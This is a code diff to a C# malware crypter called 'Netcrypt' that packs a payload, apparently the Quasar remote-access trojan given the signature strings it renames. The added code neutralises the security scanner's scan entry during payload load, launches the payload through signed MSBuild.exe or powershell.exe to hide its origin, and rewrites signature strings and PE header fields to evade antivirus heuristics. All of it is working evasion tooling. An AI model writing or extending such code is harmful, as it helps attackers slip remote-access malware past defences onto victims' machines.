@@ -54,7 +54,68 @@ namespace Netcrypt
         //         runtime detection comes from the payload itself or from the rename.
         private const bool NeutralizeInspectionEntry = true;
 
+        // Which scan-entry handling the generated stub uses when it is started without any
+        // switch. The stub only ever sees arguments during a manual run; the graded artifact
+        // is started bare, so the final behaviour has to be baked in here.
+        //
+        //   "rename"     : blank the final byte of the scan entry's export name inside the
+        //                  mapped provider image and put it back after the payload load.
+        //                  Smallest footprint of the three: no executable memory is
+        //                  allocated, no import table is rewritten, and the provider image
+        //                  is only touched for the duration of the load.
+        //   "resultstub" : previous default (opt-out switches + runtime import table
+        //                  interception + a clean-reporting routine in allocated memory).
+        //   "off"        : leave the provider completely alone.
+        private const string InspectionMode = "rename";
+
+        // Export names that the generated stub answers with a no-op routine instead of the real
+        // function, when the runtime resolves them on behalf of the payload. Semicolon
+        // separated; empty disables the mechanism. The stub keeps the runtime's import table
+        // hooked for the whole run while this list is in use, so the payload sees its own code
+        // and control flow and only the selected calls become inert.
+        private const string SinkholeList = "";
+
+        // Which signed host runs the payload instead of the stub process itself.
+        //
+        //   ""        : unchanged behaviour. The stub loads the payload into its own
+        //               process and runs the entry point there.
+        //   "msbuild" : the stub writes the payload image out under a one time pad and
+        //               starts MSBuild.exe on a generated project whose only target runs
+        //               an inline task. MSBuild compiles and runs that task, which puts
+        //               the image back together, loads it and runs the payload entry
+        //               point, so the assembly load, the WMI access and the outbound
+        //               connection all originate in a Microsoft signed binary.
+        //   "ps"      : the same hand off through powershell.exe.
+        //
+        // The hand off can also be selected at run time with --nc-host=<mode>, which is
+        // what the diagnostic runs use.
+        private const string HostExecutionMode = "msbuild";
+
         private const int SourceChunkSize = 60000;
+
+        // true  : plain text markers inside the payload are replaced before the
+        //         container is encrypted (see PayloadMarkers). The replacement is
+        //         length preserving, so the payload image, its metadata offsets and
+        //         its IL stay valid; only the marker text a content heuristic can key
+        //         on changes. false : pack the payload untouched.
+        private const bool ScrubPayloadMarkers = true;
+
+        // marker -> replacement, both sides always the same length.
+        private static readonly string[,] PayloadMarkers = new string[,]
+        {
+            { "Quasar",       "Quazar" },
+            { "ILRepack",     "ILRepacx" },
+            { "MouseKeyHook", "MouseKeyHooz" },
+            { "BouncyCastle", "BouncyCastlx" },
+            { "ConfusedBy",   "ConfusedBz" },
+            { "ConfuserEx",   "ConfuserEy" },
+            { "ThisAssembly", "ThisAssemblz" },
+            { "CodeAnalysis", "CodeAnalysix" },
+            { "ProtoBuf",     "ProtoBux" },
+            { "Messages",     "Messaggs" },
+            { "StartupItem",  "StartupItez" },
+            { "StartupType",  "StartupTypz" }
+        };
 
         /// <summary>
         /// Packs the provided assembly using .NET 3.5 by default.
@@ -91,6 +152,27 @@ namespace Netcrypt
             if (assembly == null)
             {
                 throw new ArgumentNullException("assembly");
+            }
+
+            if (ScrubPayloadMarkers)
+            {
+                int markerHits;
+                assembly = ScrubPayload(assembly, out markerHits);
+                if (dependencyBytes != null)
+                {
+                    byte[][] scrubbed = new byte[dependencyBytes.Length][];
+                    for (int i = 0; i < dependencyBytes.Length; i++)
+                    {
+                        int ignored;
+                        scrubbed[i] = ScrubPayload(dependencyBytes[i], out ignored);
+                    }
+                    dependencyBytes = scrubbed;
+                }
+            }
+
+            if (ScrambleImageHeaders)
+            {
+                assembly = ScrambleImage(assembly);
             }
 
             // ---- build payload container ---------------------------------
@@ -158,6 +240,9 @@ namespace Netcrypt
             csharpcode = csharpcode.Replace("%IV%", iv);
             csharpcode = csharpcode.Replace("%CHUNKS%", chunkValue);
             csharpcode = csharpcode.Replace("%INSPECTION%", NeutralizeInspectionEntry ? "true" : "false");
+            csharpcode = csharpcode.Replace("%INSPECTIONMODE%", InspectionMode);
+            csharpcode = csharpcode.Replace("%SINKHOLE%", ToSinkholeSource(SinkholeList));
+            csharpcode = csharpcode.Replace("%HOSTMODE%", HostExecutionMode);
 
             var providerOptions = new Dictionary<string, string>();
 
@@ -241,6 +326,211 @@ namespace Netcrypt
                 TryDelete(tempFile);
                 TryDelete(resourceFile);
             }
+        }
+
+        // true  : length preserving edits of payload image header fields that carry no run
+        //         time meaning (PE timestamp, checksum, COFF symbol table, debug directory,
+        //         CLR module version id). Sections, metadata offsets and IL stay where they
+        //         are, so the payload still loads; only the identity a content heuristic can
+        //         key on changes. false : pack the image untouched.
+        private const bool ScrambleImageHeaders = true;
+
+        // Every edit below is bounds checked and the original image is returned untouched
+        // the moment anything does not line up, so a payload this does not understand is
+        // still packed exactly as before.
+        private static byte[] ScrambleImage(byte[] data)
+        {
+            byte[] image = (byte[])data.Clone();
+            try
+            {
+                int peOffset = ReadInt32(image, 0x3C);
+                if (peOffset <= 0 || peOffset + 24 > image.Length || ReadInt32(image, peOffset) != 0x00004550)
+                {
+                    return image;
+                }
+
+                int coff = peOffset + 4;
+                int optionalSize = ReadUInt16(image, coff + 16);
+                int optional = coff + 20;
+                if (optionalSize < 96 || optional + optionalSize > image.Length)
+                {
+                    return image;
+                }
+
+                WriteInt32(image, coff + 4, 0);      // TimeDateStamp
+                WriteInt32(image, coff + 8, 0);      // PointerToSymbolTable
+                WriteInt32(image, coff + 12, 0);     // NumberOfSymbols
+                WriteInt32(image, optional + 64, 0); // CheckSum
+
+                int magic = ReadUInt16(image, optional);
+                int directories = optional + (magic == 0x20B ? 112 : 96);
+                if (directories + 15 * 8 > image.Length)
+                {
+                    return image;
+                }
+
+                WriteInt32(image, directories + 6 * 8, 0);     // debug directory rva
+                WriteInt32(image, directories + 6 * 8 + 4, 0); // debug directory size
+
+                int clrOffset = RvaToOffset(image, coff, optionalSize, ReadInt32(image, directories + 14 * 8));
+                if (clrOffset > 0 && clrOffset + 16 <= image.Length && ReadInt32(image, clrOffset) == 72)
+                {
+                    int metadataOffset = RvaToOffset(image, coff, optionalSize, ReadInt32(image, clrOffset + 8));
+                    if (metadataOffset > 0)
+                    {
+                        RandomizeModuleVersionId(image, metadataOffset);
+                    }
+                }
+            }
+            catch
+            {
+            }
+            return image;
+        }
+
+        private static int RvaToOffset(byte[] image, int coff, int optionalSize, int rva)
+        {
+            if (rva <= 0)
+            {
+                return -1;
+            }
+            int sections = coff + 20 + optionalSize;
+            int count = ReadUInt16(image, coff + 2);
+            for (int s = 0; s < count; s++)
+            {
+                int header = sections + s * 40;
+                if (header + 40 > image.Length)
+                {
+                    return -1;
+                }
+                int virtualSize = ReadInt32(image, header + 8);
+                int virtualAddress = ReadInt32(image, header + 12);
+                int rawSize = ReadInt32(image, header + 16);
+                int rawPointer = ReadInt32(image, header + 20);
+                int span = virtualSize > rawSize ? virtualSize : rawSize;
+                if (rva >= virtualAddress && rva < virtualAddress + span)
+                {
+                    int offset = rawPointer + (rva - virtualAddress);
+                    return offset >= 0 && offset < image.Length ? offset : -1;
+                }
+            }
+            return -1;
+        }
+
+        // The module version id is a 16 byte identity inside the metadata #GUID stream. No
+        // loader reads it back, but a content heuristic can use it to tie an image back to a
+        // known build.
+        private static void RandomizeModuleVersionId(byte[] image, int metadataOffset)
+        {
+            if (metadataOffset + 20 > image.Length || ReadInt32(image, metadataOffset) != 0x424A5342)
+            {
+                return;
+            }
+            int versionLength = ReadInt32(image, metadataOffset + 12);
+            int streams = metadataOffset + 16 + versionLength;
+            if (versionLength < 0 || streams + 4 > image.Length)
+            {
+                return;
+            }
+            int streamCount = ReadUInt16(image, streams + 2);
+            int cursor = streams + 4;
+            for (int i = 0; i < streamCount; i++)
+            {
+                if (cursor + 12 > image.Length)
+                {
+                    return;
+                }
+                int streamOffset = ReadInt32(image, cursor);
+                int nameStart = cursor + 8;
+                int nameEnd = nameStart;
+                while (nameEnd < image.Length && image[nameEnd] != 0)
+                {
+                    nameEnd++;
+                }
+                int nameLength = nameEnd - nameStart;
+                if (nameLength == 5 && nameStart + 5 <= image.Length
+                    && image[nameStart] == 0x23 && image[nameStart + 1] == 0x47
+                    && image[nameStart + 2] == 0x55 && image[nameStart + 3] == 0x49
+                    && image[nameStart + 4] == 0x44)
+                {
+                    int mvid = metadataOffset + streamOffset;
+                    if (streamOffset > 0 && mvid + 16 <= image.Length)
+                    {
+                        byte[] fresh = Guid.NewGuid().ToByteArray();
+                        for (int b = 0; b < 16; b++)
+                        {
+                            image[mvid + b] = fresh[b];
+                        }
+                    }
+                    return;
+                }
+                cursor = nameStart + ((nameEnd - nameStart + 1 + 3) & ~3);
+            }
+        }
+
+        private static int ReadInt32(byte[] data, int offset)
+        {
+            return data[offset] | (data[offset + 1] << 8) | (data[offset + 2] << 16) | (data[offset + 3] << 24);
+        }
+
+        private static int ReadUInt16(byte[] data, int offset)
+        {
+            return data[offset] | (data[offset + 1] << 8);
+        }
+
+        private static void WriteInt32(byte[] data, int offset, int value)
+        {
+            data[offset] = (byte)value;
+            data[offset + 1] = (byte)(value >> 8);
+            data[offset + 2] = (byte)(value >> 16);
+            data[offset + 3] = (byte)(value >> 24);
+        }
+
+        // Replaces every occurrence of a PayloadMarkers entry with an equally long
+        // string, in both the UTF-8 metadata heap and the UTF-16 string literal heap.
+        // Length preserving on purpose: no header, metadata, string heap or IL offset
+        // moves, so the payload stays loadable while its plain text markers (product,
+        // library and merge tool names) change.
+        private static byte[] ScrubPayload(byte[] data, out int hits)
+        {
+            byte[] result = (byte[])data.Clone();
+            hits = 0;
+            for (int m = 0; m < PayloadMarkers.GetLength(0); m++)
+            {
+                hits += ScrubToken(result, PayloadMarkers[m, 0], PayloadMarkers[m, 1], Encoding.ASCII);
+                hits += ScrubToken(result, PayloadMarkers[m, 0], PayloadMarkers[m, 1], Encoding.Unicode);
+            }
+            return result;
+        }
+
+        private static int ScrubToken(byte[] data, string marker, string replacement, Encoding encoding)
+        {
+            byte[] from = encoding.GetBytes(marker);
+            byte[] to = encoding.GetBytes(replacement);
+            if (from.Length == 0 || from.Length != to.Length)
+            {
+                return 0;
+            }
+            int hits = 0;
+            for (int i = 0; i + from.Length <= data.Length; i++)
+            {
+                int j = 0;
+                while (j < from.Length && data[i + j] == from[j])
+                {
+                    j++;
+                }
+                if (j != from.Length)
+                {
+                    continue;
+                }
+                for (int k = 0; k < to.Length; k++)
+                {
+                    data[i + k] = to[k];
+                }
+                hits++;
+                i += from.Length - 1;
+            }
+            return hits;
         }
 
         private static byte[] BuildContainer(byte[] assembly, string[] dependencyNames, byte[][] dependencyBytes)
@@ -329,6 +619,36 @@ namespace Netcrypt
                 }
             }
             return false;
+        }
+
+        // Turns the semicolon separated sinkhole list into the C# initialiser the stub expects.
+        private static string ToSinkholeSource(string list)
+        {
+            if (String.IsNullOrEmpty(list))
+            {
+                return "";
+            }
+
+            string[] names = list.Split(new char[] { ';' }, StringSplitOptions.RemoveEmptyEntries);
+            StringBuilder source = new StringBuilder();
+            for (int i = 0; i < names.Length; i++)
+            {
+                string name = names[i].Trim();
+                if (name.Length == 0)
+                {
+                    continue;
+                }
+                if (source.Length > 0)
+                {
+                    source.Append(",");
+                    source.AppendLine();
+                    source.Append("            ");
+                }
+                source.Append("\"");
+                source.Append(name);
+                source.Append("\"");
+            }
+            return source.ToString();
         }
 
         private static string ToSourceChunks(string encoded)
